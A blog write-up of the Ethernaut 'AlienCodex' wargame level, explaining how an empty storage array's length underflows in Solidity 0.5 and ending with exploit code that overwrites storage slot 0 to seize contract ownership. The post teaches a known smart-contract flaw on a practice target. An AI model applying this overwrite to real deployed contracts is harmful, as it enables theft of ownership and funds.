###########################
Ethernaut 19: AlienCodex
###########################
:date: 2023-10-08
:slug: ethernaut-19-aliencodex
:summary: shaggy in hackers (1995) said 'hack the planet', after 28 years this
          is the logical next step.
:tags: programming
:author: capu
:featured_image:


Objective
=========
Claim ownership of the contract

Code
====
.. code-block:: solidity
    :linenos: inline
    :hl_lines: 1 22

    pragma solidity ^0.5.0;
    import {Ownable} from "./Ownable-05.sol";

    contract AlienCodex is Ownable {
        bool public contact;
        bytes32[] public codex;

        modifier contacted() {
            assert(contact);
            _;
        }

        function make_contact() public {
            contact = true;
        }

        function record(bytes32 _content) public contacted {
            codex.push(_content);
        }

        function retract() public contacted {
            codex.length--;
        }

        function revise(uint256 i, bytes32 _content) public contacted {
            codex[i] = _content;
        }
    }

The idea is that you ``make_contact()`` with this alien and then you can append
(``record()``), pop (``retract()``) or modify (``revise()``) a storage array which
is the supposed communication.

.. code-block:: plain
    :linenos: inline
    :hl_lines: 

    [I] capu ~/s/ethernaut-solutions (master)> forge inspect --pretty  AlienCodex  storageLayout
    | Name    | Type      | Slot | Offset | Bytes | Contract                                   |
    |---------|-----------|------|--------|-------|--------------------------------------------|
    | _owner  | address   | 0    | 0      | 20    | src/levels/19-AlienCodex-05.sol:AlienCodex |
    | contact | bool      | 0    | 20     | 1     | src/levels/19-AlienCodex-05.sol:AlienCodex |
    | codex   | bytes32[] | 1    | 0      | 32    | src/levels/19-AlienCodex-05.sol:AlienCodex |


I gotta find a way to write my address to storage slot 0.

Solution
========
Too late to not see the highlighted lines? Well, it's okay, because this one is
pretty hard anyway. 

The first smell is that under solidity 0.5.0, it's possible to write to the
``.length`` member of an array, and no checks are in place to avoid decrementing
an empty array.

.. note::

    also, keep in mind that arithmetic used to overflow silently until verison
    0.8.0.

So decrementing an empty array should actually make it of ``uint256.max``
length!

That, coupled to the fact that I can use ``revise()`` to write to any index of
the array, looks like a blank check to write to any storage position. looking
into the `changes to the next major version
<https://docs.soliditylang.org/en/v0.6.0/060-breaking-changes.html>`_ seems to
confirm this was a problem:

    Member-access to length of arrays is now always read-only, even for storage
    arrays. It is no longer possible to resize storage arrays assigning a new value
    to their length. Use push(), push(value) or pop() instead, or assign a full
    array, which will of course overwrite existing content. The reason behind this
    is to prevent **storage collisions by gigantic storage arrays**.

I seem to have a plan now:

- make contact
- ``retract()`` to overflow the length of the array 
- find where I would have to write to the array so it overwrites storage
  slot 0
- call ``revise`` with that index, plus the correctly padded address
- 😎

Step three is where I have to engage some braincells. First, `the docs:
<https://docs.soliditylang.org/en/v0.8.21/internals/layout_in_storage.html#mappings-and-dynamic-arrays>`_ 

    Assume the storage location of the mapping or array ends up being a slot ``p`` [...]
    Array data is located starting at ``keccak256(p)`` and it is laid out in the same
    way as statically-sized array data would: One element after the other,
    potentially sharing storage slots if the elements are not longer than 16 bytes

- from the output of ``forge inspect`` in the beggining of the article, I know
  that ``p == 1``
- we can forget about the last part, since the elements are ``bytes32``

So ``codex[0]`` will end up at position ``keccak256(1)`` 

.. code-block:: solidity
    :linenos: inline
    :hl_lines: 

    ➜ uint(keccak256(abi.encodePacked(uint(1))))
    Type: uint
    ├ Hex: 0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6
    └ Decimal: 80084422859880547211683076133703299733277748156566366325829078699459944778998

keep in mind that awfully long number is where the *start* of the array will be.
Whatever I pass to ``revise()`` as ``i`` will be *added* to it, and I want the
result of it to overflow to a value of zero

.. code-block:: solidity
    :linenos: inline
    :hl_lines: 

    (keccak256(1) + i ) % uint256.max == 0
    // % -> - is equivalent for only one overflow
    // the +1 is because uint256.max is a value that can actually be held, one
    // more than that triggers the overflow
    (keccak256(1) + i ) - (uint256.max + 1) == 0
    (keccak256(1) + i ) == uint256.max + 1
    i == uint256.max - keccak256(1) + 1
    // ------------------------------------- 
    ➜ type(uint).max - uint(keccak256(abi.encodePacked(uint(1)))) + 1
    Type: uint
    ├ Hex: 0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a
    └ Decimal: 35707666377435648211887908874984608119992236509074197713628505308453184860938

All that primary education finally paid off.
And tying all the steps together:

.. code-block:: solidity
    :linenos: inline

    IAlienCodex target = IAlienCodex(target_);
    // this'll break the 'contacted' slot, I do not care.
    bytes32 storageContent = bytes32(bytes20(attacker)) >> 12*8;
    uint256 indexForStorageStart  = type(uint256).max - uint256(
        keccak256(abi.encodePacked(bytes32(uint256(1))))
      ) + 1;
    target.make_contact();
    target.retract();
    target.revise(
      indexForStorageStart ,
      storageContent
    );
